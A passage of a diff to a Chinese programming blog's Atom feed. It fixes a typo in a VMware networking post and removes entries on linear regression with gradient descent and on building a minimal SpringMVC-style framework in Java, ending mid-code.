     <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。</p>
 <p>这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p>
@@ -650,7 +867,7 @@
     <link href="http://yoursite.com/2018/03/13/%E5%B7%A5%E5%85%B7-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
     <id>http://yoursite.com/2018/03/13/工具-虚拟机的一些坑/</id>
     <published>2018-03-13T09:25:11.000Z</published>
-    <updated>2018-03-16T09:39:44.709Z</updated>
+    <updated>2018-03-23T13:02:40.679Z</updated>
     
     <content type="html"><![CDATA[<h3 id="虚拟机的三种联网方式"><a href="#虚拟机的三种联网方式" class="headerlink" title="虚拟机的三种联网方式"></a>虚拟机的三种联网方式</h3><p>vmware为我们提供了三种网络工作模式，它们分别是：Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。</p>
 <p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。</p>
@@ -716,7 +933,7 @@
 <p><img src="/images/工具--虚拟机-三种联网方式-21.png" alt="How-ten" title="工具--虚拟机-三种联网方式-21"></p>
 <p>然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。</p>
 <p>那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。</p>
-<h4 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h4><p>ost-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：</p>
+<h4 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h4><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：</p>
 <p><img src="/images/工具--虚拟机-三种联网方式-22.png" alt="enter description here" title="工具--虚拟机-三种联网方式-22"></p>
 <p>通过上图，我们可以发现，如果要使得虚拟机能联网，我们可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。</p>
 <h3 id="Ubantu去掉图形界面"><a href="#Ubantu去掉图形界面" class="headerlink" title="Ubantu去掉图形界面"></a>Ubantu去掉图形界面</h3><ul>
@@ -1570,275 +1787,6 @@ public ServletContext getServletContext();//返回Servlet上下文对象的引�
     
     
       <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>机器学习|1-线性回归</title>
-    <link href="http://yoursite.com/2018/02/27/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-1-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
-    <id>http://yoursite.com/2018/02/27/机器学习-1-线性回归/</id>
-    <published>2018-02-26T18:37:58.000Z</published>
-    <updated>2018-02-26T15:46:51.948Z</updated>
-    
-    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
-});
-</script>
-
-<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
-</script>
-
-<blockquote>
-<p>机器学习(Machine Learning, ML)是一门多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，重新组织已有的知识结构使之不断改善自身的性能。</p>
-</blockquote>
-<p>自己作为计算机专业的一员，在写了几个只要增删改查的项目后，发现自己对写代码这个活动不是很有兴趣了，有点厌倦了。现在业内人都在说人工智能、机器学习等高大尚的东西，起初自己认为这些东西不是本科生能掌握的东西，但接触后发现自己错了，也就是那么一回事。</p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章的主角是线性回归，也就是LR(Linear Regression)，是机器学习得基础算法。</p>
-<p>回归(Regression)问题是机器学习里面很大的一块。</p>
-<blockquote>
-<p>统计学中，回归分析（regression analysis)指的是确定两种或两种以上变量间相互依赖的定量关系的一种统计分析方法。回归分析按照涉及的变量的多少，分为一元回归和多元回归分析；按照因变量的多少，可分为简单回归分析和多重回归分析；按照自变量和因变量之间的关系类型，可分为线性回归分析和非线性回归分析。</p>
-</blockquote>
-<p>不玩定义，直接上例子，设想一下这样的场景： 如果我现在有了一组(身高, 体重)的数据集，可以令身高为x值，体重为y值将其画在纸上，就和下图一样。</p>
-<p><img src="/images/机器学习-线性回归-01.png" alt="机器学习-线性回归" title="机器学习-线性回归-01"></p>
-<p>那么现在问题来了，假设我身高为1.8m，能不能预测出我的体重？这就是回归要解决的问题，我希望得到一个函数，我输入我的身高之后他能够帮我预测出我的体重。<br>在这个例子里，我假设身高和体重的关系是线性关系，所以假设模型是y=kx+b这种一次函数，为了确定变量k和b，我需要利用之前的数据去学习出这两个参数。<br>尽管上面的例子误差很大。因为体重的函数肯定不单单由身高这一个特征(feature)决定，而且即使只有身高一个特征，最佳函数也很可能不是一次函数。</p>
-<h4 id="回归问题相关概念"><a href="#回归问题相关概念" class="headerlink" title="回归问题相关概念"></a>回归问题相关概念</h4><p>通常，这类预测问题可以用回归(regression)模型进行解决，回归模型定义了输入与输出的关系，输入即现有知识，而输出则为预测。<br>一个预测问题在回归模型下的解决步骤为：</p>
-<ul>
-<li>积累知识： 我们将储备的知识称之为训练集(Training Set)，毕竟预测是需要过去的数据作为参考的，这个很好理解。</li>
-<li>学习：当我们有了数据的时候，我们就需要去学习这些数据，为什么说机器学习智能？因为当我告诉计算机我的模型是线性(一次函数)或其他类型的函数然后把数据直接倒进去之后它就能返回给我最后的函数(参数都训练好了)。</li>
-<li>预测：学习完成后，当接受了新的数据（输入）后，我们就能通过学习阶段获得的对应关系来预测输出。</li>
-</ul>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>这篇博客主要讲的是线性回归(Linear regression)，经过前言后大家也知道了，回归里面用到的函数有多种多样的，这个需要开发者自己去选择，这次先介绍最简单的线性回归(Linear regression)。</p>
-<h4 id="线性回归LR-Linear-Regression"><a href="#线性回归LR-Linear-Regression" class="headerlink" title="线性回归LR(Linear Regression)"></a>线性回归LR(Linear Regression)</h4><p>从数学上来说，给定由d个属性描述的示例x=(x1;x2;…;xd),其中xi是x在第i个属性上的取值，线性模型试图学得一个通过属性的线性组合来进行预测的函数，即:</p>
-<p><img src="/images/机器学习-线性回归-02.png" alt="机器学习-线性回归" title="机器学习-线性回归-02"></p>
-<p>一般用向量形式:</p>
-<p><img src="/images/机器学习-线性回归-03.png" alt="机器学习-线性回归" title="机器学习-线性回归-03"></p>
-<p>好了，现在我们知道了线性回归模型的基本形式了，那么我们现在的任务就是要去学习出这个w向量和b这些参数的值，有了这个值我们才能去做预测。</p>
-<p>一般来说，我们会给w和b一个初始值，然后我们去修正这些值来让这些值符合预期，那么我们怎么去修正这些值呢？我们需要一个<strong>损失函数</strong>(loss function)，这个函数用来指明我的预测值和训练数据实际值的差别。<br>那么这个损失函数(loss function)是什么，以及我们怎么用它来修正我们的参数w和b，看下面。</p>
-<h3 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h3><p>不知道大家知不知道启发式搜索(Heuristically Search)？</p>
-<blockquote>
-<p>启发式搜索(Heuristically Search)又称为有信息搜索(Informed Search)，它是利用问题拥有的启发信息来引导搜索，达到减少搜索范围、降低问题复杂度的目的，这种利用启发信息的搜索过程称为启发式搜索。——百度百科</p>
-</blockquote>
-<p>举个例子，大一大二在大学里面的时候我是有单车的，晚上下课的时候在停车场里面经常忘记自己的车停在哪，要找半天才能找得到，这种就叫盲目搜索，广度优先搜索(BFS)和宽度优先搜索(DFS)都是盲目搜索。</p>
-<p>那么如果我手里有个黑科技，能够告诉我我现在距离我的爱车多远，那么我是不是可以以此为依据，往距离逐渐减少的方向去搜索呢？这就是启发式搜索(Heuristically Search)，Astar(A*)寻路算法等就是启发式搜索。<br>启发式搜索与机器学习有一些概念是共通的，那么对于机器学习来说，我也同样需要一个和“距离我爱车多远”这样一个指标来判断我现在参数距离我最优参数有“多远”。我们可以统一的把这种东西叫做损失函数(loss function)</p>
-<h4 id="损失函数-Loss-Function"><a href="#损失函数-Loss-Function" class="headerlink" title="损失函数(Loss Function)"></a>损失函数(Loss Function)</h4><p>我们给之前例子里的函数一个名字，叫假设函数(hypothesis function)，意为预估值函数。损失函数则是用来衡量假设函数(hypothesis function)的准确性，具体衡量指标有很多，这里我们和吴恩达教程里面一样采用平方差的方式计算。</p>
-<p><img src="/images/机器学习-线性回归-04.png" alt="机器学习-线性回归" title="机器学习-线性回归-04"></p>
-<p>其中函数J就是损失函数(为什么是J我好好奇)，函数h是假设函数，可以看到后面是平方差的平均值然后除以了个2。</p>
-<blockquote>
-<p>公式2*m里面的2其实就是为了后面求偏导的时候可以把分数消掉，没什么太大的实际意义。</p>
-</blockquote>
-<h4 id="梯度下降算法-Gradient-descent-algorithm"><a href="#梯度下降算法-Gradient-descent-algorithm" class="headerlink" title="梯度下降算法(Gradient descent algorithm)"></a>梯度下降算法(Gradient descent algorithm)</h4><p>既然我们现在知道了当前怎么评价当前参数的好坏，那么我怎么去修正参数让参数更好(损失函数的最小值)呢？</p>
-<p>高中生都知道，在一元函数里面，导数的几何意义就是函数变化增加最快的方向。梯度其实类似，也是类似的，说白了就是一个向量，表示上升最快的方向。</p>
-<p>那么我们就可以得到一个修正的公式，我们迭代这个公式许多次来修正参数。</p>
-<p><img src="/images/机器学习-线性回归-05.png" alt="机器学习-线性回归" title="机器学习-线性回归-05"></p>
-<p>这里是减号是因为梯度表示上升最快，所以用的是负梯度。</p>
-<p>然后其中其中α表示学习速率(learning rate)，这个值越大每次修正的就越多，不过这个不是越高越好，如果太高了可能会一直在最低点“摆动”而无法收敛。也有的使用可变的学习速率，一开始设置较高，接近最低点的过程中逐渐降低。</p>
-<p><img src="/images/机器学习-线性回归-06.png" alt="机器学习-线性回归" title="机器学习-线性回归-06"></p>
-<p>接下来我们看一下求导之后的结果:</p>
-<p><img src="/images/机器学习-线性回归-07.png" alt="机器学习-线性回归" title="机器学习-线性回归-07"></p>
-<blockquote>
-<p>这里有一点值得注意的是，在这个梯度下降中我们每次迭代都使用了所有的m个训练数据，这种也叫批量梯度下降法Batch Gradient Descent，BGD<br>这样每次迭代都将对m个样本进行计算，计算量大。所以有些优化方案，有兴趣的可以去看一下</p>
-</blockquote>
-<p>现在我们知道了如何去修正参数了，但我们实际上修正之后得到的是损失函数(loss function)的极小值而不一定是最小值.</p>
-<p><img src="/images/机器学习-线性回归-08.png" alt="机器学习-线性回归" title="机器学习-线性回归-08"></p>
-<p><img src="/images/机器学习-线性回归-09.png" alt="机器学习-线性回归" title="机器学习-线性回归-09"></p>
-<ol>
-<li>由于起始点(起始参数)的不同，最后可能得到的并不是全局的最优解(损失函数最小)。我说一下从西瓜书上看到的几个优化方法。</li>
-<li>以多组不同的参数值初始化，反正就是找多个起点选最好的结果。</li>
-<li>使用“模拟退火”(Simulated Annealing)技术，模拟退火在每一步都以一定概率接受比当前解更差的结果，从而有助于“跳出”局部极小。在每步迭代过程中，接受“次优解”的概率会随着时间的推移而逐步降低，从而保证算法的稳定。</li>
-<li>使用随机梯度下降，它在计算梯度的时候加入了随机因素，所以即使陷入了局部极小值，它计算出来的梯度仍然可能不为0，这样就有机会跳出局部极小继续搜索。</li>
-</ol>
-<blockquote>
-<p>转载 <a href="https://juejin.im/post/5a37b4cf6fb9a045023bbe25" target="_blank" rel="external">https://juejin.im/post/5a37b4cf6fb9a045023bbe25</a></p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;script type=&quot;text/x-mathjax-config&quot;&gt;
-MathJax.Hub.Config({
-tex2jax: {inlineMath: [[&#39;$&#39;,&#39;$&#39;], [&#39;\\(&#39;,&#39;\\)&#39;]]}
-});
-&lt;/script&gt;
-
-&lt;script type=&quot;te
-    
-    </summary>
-    
-      <category term="机器学习" scheme="http://yoursite.com/categories/machine/"/>
-    
-    
-      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Java|自己撸一个SpringMVC框架</title>
-    <link href="http://yoursite.com/2018/02/25/Java-%E5%BE%92%E6%89%8B%E6%92%B8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0SpringMVC%E6%A1%86%E6%9E%B6/"/>
-    <id>http://yoursite.com/2018/02/25/Java-徒手撸框架-实现SpringMVC框架/</id>
-    <published>2018-02-24T18:37:19.000Z</published>
-    <updated>2018-02-24T14:53:24.619Z</updated>
-    
-    <content type="html"><![CDATA[<p>Spring框架对于Java后端程序员来说再熟悉不过了，以前只知道它用的反射实现的，但了解之后才知道有很多巧妙的设计在里面。如果不看Spring的源码，你将会失去一次和大师学习的机会：它的代码规范，设计思想很值得学习。我们程序员大部分人都是野路子，不懂什么叫代码规范。写了一个月的代码，最后还得其他老司机花3天时间重构，相信大部分老司机都很头疼看新手的代码。</p>
-<p>废话不多说，我们进入今天的正题，在Web应用程序设计中，MVC模式已经被广泛使用。SpringMVC以DispatcherServlet为核心，负责协调和组织不同组件以完成请求处理并返回响应的工作，实现了MVC模式。想要实现自己的SpringMVC框架，需要从以下几点入手：</p>
-<ul>
-<li>了解SpringMVC运行流程及九大组件</li>
-<li>自己实现SpringMVC的功能分析</li>
-<li>手写SpringMVC框架</li>
-</ul>
-<h3 id="了解SpringMVC运行流程及九大组件"><a href="#了解SpringMVC运行流程及九大组件" class="headerlink" title="了解SpringMVC运行流程及九大组件"></a>了解SpringMVC运行流程及九大组件</h3><h4 id="SpringMVC的运行流程"><a href="#SpringMVC的运行流程" class="headerlink" title="SpringMVC的运行流程"></a>SpringMVC的运行流程</h4><p><img src="/images/springMVC-01.jpg" alt="springMVC" title="springMVC-01"></p>
-<ul>
-<li>用户发送请求至前端控制器DispatcherServlet</li>
-<li>DispatcherServlet收到请求调用HandlerMapping处理器映射器。</li>
-<li>处理器映射器根据请求url找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet。</li>
-<li>DispatcherServlet通过HandlerAdapter处理器适配器调用处理器<br>执行处理器(Controller，也叫后端控制器)。</li>
-<li>Controller执行完成返回ModelAndView</li>
-<li>HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet</li>
-<li>DispatcherServlet将ModelAndView传给ViewReslover视图解析器</li>
-<li>ViewReslover解析后返回具体View</li>
-<li>DispatcherServlet对View进行渲染视图（即将模型数据填充至视图中）。</li>
-<li>DispatcherServlet响应用户。</li>
-</ul>
-<p>从上面可以看出，DispatcherServlet有接受请求，响应结果，转发等作用。有了DispatcherServlet之后，可以减少组件之间的耦合度。</p>
-<h4 id="SpringMVC的九大组件"><a href="#SpringMVC的九大组件" class="headerlink" title="SpringMVC的九大组件"></a>SpringMVC的九大组件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">protected void initStrategies(ApplicationContext context) &#123;</div><div class="line">	//用于处理上传请求。处理方法是将普通的request包装成MultipartHttpServletRequest，后者可以直接调用getFile方法获取File.</div><div class="line">	initMultipartResolver(context);</div><div class="line">	//SpringMVC主要有两个地方用到了Locale：一是ViewResolver视图解析的时候；二是用到国际化资源或者主题的时候。</div><div class="line">	initLocaleResolver(context); </div><div class="line">	//用于解析主题。SpringMVC中一个主题对应一个properties文件，里面存放着跟当前主题相关的所有资源、</div><div class="line">	//如图片、css样式等。SpringMVC的主题也支持国际化， </div><div class="line">	initThemeResolver(context);</div><div class="line">	//用来查找Handler的。</div><div class="line">	initHandlerMappings(context);</div><div class="line">	//从名字上看，它就是一个适配器。Servlet需要的处理方法的结构却是固定的，都是以request和response为参数的方法。</div><div class="line">	//如何让固定的Servlet处理方法调用灵活的Handler来进行处理呢？这就是HandlerAdapter要做的事情</div><div class="line">	initHandlerAdapters(context);</div><div class="line">	//其它组件都是用来干活的。在干活的过程中难免会出现问题，出问题后怎么办呢？</div><div class="line">	//这就需要有一个专门的角色对异常情况进行处理，在SpringMVC中就是HandlerExceptionResolver。</div><div class="line">	initHandlerExceptionResolvers(context);</div><div class="line">	//有的Handler处理完后并没有设置View也没有设置ViewName，这时就需要从request获取ViewName了，</div><div class="line">	//如何从request中获取ViewName就是RequestToViewNameTranslator要做的事情了。</div><div class="line">	initRequestToViewNameTranslator(context);</div><div class="line">	//ViewResolver用来将String类型的视图名和Locale解析为View类型的视图。</div><div class="line">	//View是用来渲染页面的，也就是将程序返回的参数填入模板里，生成html（也可能是其它类型）文件。</div><div class="line">	initViewResolvers(context);</div><div class="line">	//用来管理FlashMap的，FlashMap主要用在redirect重定向中传递参数。</div><div class="line">	initFlashMapManager(context); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="自己实现SpringMVC功能分析"><a href="#自己实现SpringMVC功能分析" class="headerlink" title="自己实现SpringMVC功能分析"></a>自己实现SpringMVC功能分析</h3><p>本片文章只实现SpringMVC的配置加载、实例化扫描的包、HandlerMapping的url映射到对应的Controller的method上、异常的拦截和动态调用后返回结果输出给浏览器的功能。其余SpringMVC功能读者可以尝试自己实现。</p>
-<h4 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h4><p><img src="/images/springMVC-02.png" alt="springMVC" title="springMVC-02"></p>
-<p> 从图中可以看出，SpringMVC本质上是一个Servlet,这个 Servlet 继承自 HttpServlet。FrameworkServlet负责初始化SpringMVC的容器，并将Spring容器设置为父容器。因为本文只是实现SpringMVC，对于Spring容器不做过多讲解。</p>
-<p> 为了读取web.xml中的配置，我们用到ServletConfig这个类，它代表当前Servlet在web.xml中的配置信息。通过web.xml中加载我们自己写的MyDispatcherServlet和读取配置文件。</p>
-<h4 id="初始化阶段"><a href="#初始化阶段" class="headerlink" title="初始化阶段"></a>初始化阶段</h4><p>在上文中，我们知道了DispatcherServlet的initStrategies方法会初始化9大组件，但是本文将实现一些SpringMVC的最基本的组件而不是全部，按顺序包括：</p>
-<ul>
-<li>加载配置文件</li>
-<li>初始化所有相关联的类，扫描用户设定的包下面所有的类</li>
-<li>拿到扫描到的类，通过反射机制，实例化。并且放到ioc容器中(Map的键值对  beanName-bean) beanName默认是首字母小写</li>
-<li>初始化HandlerMapping，其实就是将一个Map的键值对 key是url，value是所调用的方法put进去(将url和method对应上)</li>
-</ul>
-<h4 id="运行阶段"><a href="#运行阶段" class="headerlink" title="运行阶段"></a>运行阶段</h4><p>每一次请求将会调用doGet或doPost方法，所以统一运行阶段都放在doDispatch方法里处理，它会根据url请求去HandlerMapping中匹配到对应的Method，然后利用反射机制调用Controller中的方法，并得到结果返回。按顺序包括以下功能：</p>
-<ul>
-<li>异常的拦截</li>
-<li>获取请求传入的参数并处理参数</li>
-<li>通过初始化好的handlerMapping的Map容器中拿出url对应的方法名，反射调用</li>
-</ul>
-<h3 id="手写SpringMVC框架"><a href="#手写SpringMVC框架" class="headerlink" title="手写SpringMVC框架"></a>手写SpringMVC框架</h3><p> 工程文件及目录：</p>
-<p> <img src="/images/springMVC-03.png" alt="springMVC" title="springMVC-03"></p>
-<p>首先，新建一个maven项目，在pom.xml中导入以下依赖。为了方便，博主直接导入了Springboot的web包，里面有我们需要的所有web开发的东西：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</div><div class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</div><div class="line">  &lt;groupId&gt;com.liugh&lt;/groupId&gt;</div><div class="line">  &lt;artifactId&gt;liughMVC&lt;/artifactId&gt;</div><div class="line">  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</div><div class="line">  &lt;packaging&gt;war&lt;/packaging&gt;</div><div class="line">  </div><div class="line"> &lt;dependencyManagement&gt;</div><div class="line">		&lt;dependencies&gt;</div><div class="line">			&lt;dependency&gt;</div><div class="line">				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</div><div class="line">				&lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;</div><div class="line">				&lt;version&gt;1.4.3.RELEASE&lt;/version&gt;</div><div class="line">				&lt;type&gt;pom&lt;/type&gt;</div><div class="line">				&lt;scope&gt;import&lt;/scope&gt;</div><div class="line">			&lt;/dependency&gt;</div><div class="line">		&lt;/dependencies&gt;</div><div class="line">	&lt;/dependencyManagement&gt;</div><div class="line">	&lt;properties&gt;</div><div class="line">		&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</div><div class="line">		&lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;</div><div class="line">		&lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;</div><div class="line">		&lt;java.version&gt;1.8&lt;/java.version&gt;</div><div class="line">	&lt;/properties&gt;</div><div class="line">	</div><div class="line">	&lt;dependencies&gt;</div><div class="line">  		&lt;dependency&gt;</div><div class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</div><div class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</div><div class="line">        &lt;/dependency&gt;</div><div class="line">    &lt;/dependencies&gt;</div><div class="line">&lt;/project&gt;</div></pre></td></tr></table></figure></p>
-<p>接着，我们在WEB-INF下创建一个web.xml，如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</div><div class="line">	xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:web=&quot;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</div><div class="line">	xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</div><div class="line">	version=&quot;3.0&quot;&gt;</div><div class="line">	&lt;servlet&gt;</div><div class="line">		&lt;servlet-name&gt;MySpringMVC&lt;/servlet-name&gt;</div><div class="line">		&lt;servlet-class&gt;com.liugh.servlet.MyDispatcherServlet&lt;/servlet-class&gt;</div><div class="line">		&lt;init-param&gt;</div><div class="line">			&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</div><div class="line">			&lt;param-value&gt;application.properties&lt;/param-value&gt;</div><div class="line">		&lt;/init-param&gt;</div><div class="line">		&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</div><div class="line">	&lt;/servlet&gt;</div><div class="line">	&lt;servlet-mapping&gt;</div><div class="line">		&lt;servlet-name&gt;MySpringMVC&lt;/servlet-name&gt;</div><div class="line">		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">	&lt;/servlet-mapping&gt;</div><div class="line"></div><div class="line">&lt;/web-app&gt;</div></pre></td></tr></table></figure></p>
-<p>application.properties文件中只是配置要扫描的包到SpringMVC容器中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scanPackage=com.liugh.core</div></pre></td></tr></table></figure></p>
-<p>创建自己的Controller注解，它只能标注在类上面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">package com.liugh.annotation;</div><div class="line"></div><div class="line">import java.lang.annotation.Documented;</div><div class="line">import java.lang.annotation.ElementType;</div><div class="line">import java.lang.annotation.Retention;</div><div class="line">import java.lang.annotation.RetentionPolicy;</div><div class="line">import java.lang.annotation.Target;</div><div class="line"></div><div class="line">@Target(ElementType.TYPE)</div><div class="line">@Retention(RetentionPolicy.RUNTIME)</div><div class="line">@Documented</div><div class="line">public @interface MyController &#123;</div><div class="line">	/**</div><div class="line">     * 表示给controller注册别名</div><div class="line">     * @return</div><div class="line">     */</div><div class="line">    String value() default &quot;&quot;;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>RequestMapping注解，可以在类和方法上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">package com.liugh.annotation;</div><div class="line"></div><div class="line">import java.lang.annotation.Documented;</div><div class="line">import java.lang.annotation.ElementType;</div><div class="line">import java.lang.annotation.Retention;</div><div class="line">import java.lang.annotation.RetentionPolicy;</div><div class="line">import java.lang.annotation.Target;</div><div class="line"></div><div class="line">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</div><div class="line">@Retention(RetentionPolicy.RUNTIME)</div><div class="line">@Documented</div><div class="line">public @interface MyRequestMapping &#123;</div><div class="line">	/**</div><div class="line">     * 表示访问该方法的url</div><div class="line">     * @return</div><div class="line">     */</div><div class="line">    String value() default &quot;&quot;;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>RequestParam注解,只能注解在参数上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">package com.liugh.annotation;</div><div class="line"></div><div class="line">import java.lang.annotation.Documented;</div><div class="line">import java.lang.annotation.ElementType;</div><div class="line">import java.lang.annotation.Retention;</div><div class="line">import java.lang.annotation.RetentionPolicy;</div><div class="line">import java.lang.annotation.Target;</div><div class="line"></div><div class="line">@Target(ElementType.PARAMETER)</div><div class="line">@Retention(RetentionPolicy.RUNTIME)</div><div class="line">@Documented</div><div class="line">public @interface MyRequestParam &#123;</div><div class="line">	/**</div><div class="line">     * 表示参数的别名，必填</div><div class="line">     * @return</div><div class="line">     */</div><div 